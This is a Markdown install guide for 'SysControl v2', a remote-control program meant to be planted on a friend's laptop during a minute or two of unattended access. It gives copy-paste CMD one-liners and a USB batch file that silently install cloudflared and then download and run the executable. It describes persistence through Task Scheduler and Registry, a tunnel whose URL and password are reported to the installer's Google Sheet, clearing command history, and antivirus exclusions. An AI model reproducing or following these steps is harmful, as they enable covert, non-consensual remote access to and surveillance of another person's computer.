# SysControl v2 — Silent Install Guide

> One-time physical access to the laptop. Open CMD, paste commands, done.
> Total time: ~2 minutes.

---

## What You Need Before Going

1. The laptop must have **internet connection**
2. You need **1-2 minutes** alone with the laptop
3. Your latest `SystemMonitor.exe` uploaded to GitHub Releases

---

## Pre-Check: Upload .exe to GitHub Releases

Before going to your friend's laptop, make sure your `.exe` is uploaded:

1. Build the exe:
   ```
   cd D:\Code\SysControl-v2\backend
   build.bat
   ```
2. Go to: https://github.com/ajit421/SysControl-v2/releases
3. Click **"Draft a new release"**
4. Tag: `v2.x.x` — Title: `v2.x.x`
5. Attach `backend\dist\SystemMonitor.exe`
6. Click **"Publish release"**
7. After publishing, right-click the `.exe` link → Copy link address
8. Replace `DOWNLOAD_URL` below with that link

---

## Method 1: Single CMD Session (Recommended)

Open **CMD as Administrator** (right-click CMD → Run as administrator)

Paste these commands **one by one**:

### Step 1 — Install Cloudflare Tunnel (30 sec)

```cmd
winget install Cloudflare.cloudflared --accept-package-agreements --accept-source-agreements
```

> If winget asks for confirmation, press `Y` and Enter.
> If `winget` is not available (old Windows), use Step 1B instead.

### Step 1B — Manual Cloudflare Install (if winget fails)

```cmd
curl -L -o "%TEMP%\cloudflared.msi" https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.msi
msiexec /i "%TEMP%\cloudflared.msi" /qn
del "%TEMP%\cloudflared.msi"
```

### Step 2 — Create hidden folder + download exe (30 sec)

```cmd
mkdir "%APPDATA%\SystemMonitor"
curl -L -o "%APPDATA%\SystemMonitor\SystemMonitor.exe" https://github.com/ajit421/SysControl-v2/releases/latest/download/SystemMonitor.exe
```

> This downloads directly from your latest GitHub release.
> The file goes to `C:\Users\<their-name>\AppData\Roaming\SystemMonitor\`

### Step 3 — Run it once (5 sec)

```cmd
start "" "%APPDATA%\SystemMonitor\SystemMonitor.exe"
```

### Step 4 — Verify it started (optional, 10 sec)

```cmd
tasklist | findstr SystemMonitor
```

> If you see `SystemMonitor.exe` in the list, it's running.

### Step 5 — Clean up and leave

- Close CMD
- Clear CMD history: press `Alt+F7` in CMD before closing, or just close it
- The exe auto-registers itself for startup (Task Scheduler + Registry)
- It will start every time the laptop boots — no action needed

---

## Method 2: One-Liner (Fastest — under 60 sec)

If cloudflared is already installed, paste this single line:

```cmd
mkdir "%APPDATA%\SystemMonitor" 2>nul & curl -L -o "%APPDATA%\SystemMonitor\SystemMonitor.exe" https://github.com/ajit421/SysControl-v2/releases/latest/download/SystemMonitor.exe & start "" "%APPDATA%\SystemMonitor\SystemMonitor.exe"
```

If cloudflared is NOT installed, paste this (two lines):

```cmd
winget install Cloudflare.cloudflared --accept-package-agreements --accept-source-agreements
```

```cmd
mkdir "%APPDATA%\SystemMonitor" 2>nul & curl -L -o "%APPDATA%\SystemMonitor\SystemMonitor.exe" https://github.com/ajit421/SysControl-v2/releases/latest/download/SystemMonitor.exe & start "" "%APPDATA%\SystemMonitor\SystemMonitor.exe"
```

---

## Method 3: USB Drive (No Internet Needed on Target)

### Prepare USB at home:

1. Download `cloudflared.msi` from: https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.msi
2. Copy your `SystemMonitor.exe` from `backend\dist\`
3. Create a file called `setup.bat` with this content:

```bat
@echo off
msiexec /i "%~dp0cloudflared.msi" /qn
mkdir "%APPDATA%\SystemMonitor" 2>nul
copy /Y "%~dp0SystemMonitor.exe" "%APPDATA%\SystemMonitor\SystemMonitor.exe"
start "" "%APPDATA%\SystemMonitor\SystemMonitor.exe"
exit
```

4. Put all 3 files on USB: `cloudflared.msi`, `SystemMonitor.exe`, `setup.bat`

### At the laptop:

1. Plug in USB
2. Open the USB folder
3. Right-click `setup.bat` → **Run as administrator**
4. Done. Remove USB.

> Internet is still needed AFTER setup for the tunnel to connect.

---

## What Happens Automatically After Install

| Action | How |
|--------|-----|
| Auto-start on boot | Task Scheduler + Registry Run key (dual approach) |
| Device name | Uses laptop hostname automatically |
| Password | Random generated, stored in Windows Credential Manager |
| Tunnel | Cloudflare Quick Tunnel, new URL each restart |
| Registration | Sends URL + password to your Google Sheet every 3 min |
| Crash recovery | Auto-restarts after 10 sec if it crashes |

---

## How to Verify From Your Side

1. Open your frontend: your Netlify URL
2. Login with your credentials
3. The device should appear in the device list within 1-2 minutes
4. Status will show **Online** with a green dot
5. Click to connect — password is auto-filled from Google Sheet

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Device not showing up | Wait 2-3 min for first heartbeat to register |
| `winget` not found | Use Method 1B (curl + msiexec) or Method 3 (USB) |
| `curl` not found | Windows 10 1803+ has curl built-in. Use Method 3 for older |
| Cloudflared not in PATH | Restart CMD after installing, or reboot the laptop |
| Blocked by antivirus | Add exclusion for `%APPDATA%\SystemMonitor\` folder |
| Download shows 0 bytes | Check GitHub repo is **public** — private repos return 404 |

---

## Time Breakdown

| Step | Time |
|------|------|
| Open CMD | 5 sec |
| Install cloudflared | 20-30 sec |
| Download exe | 10-20 sec |
| Run exe | 2 sec |
| Verify + close | 10 sec |
| **Total** | **~1-2 min** |
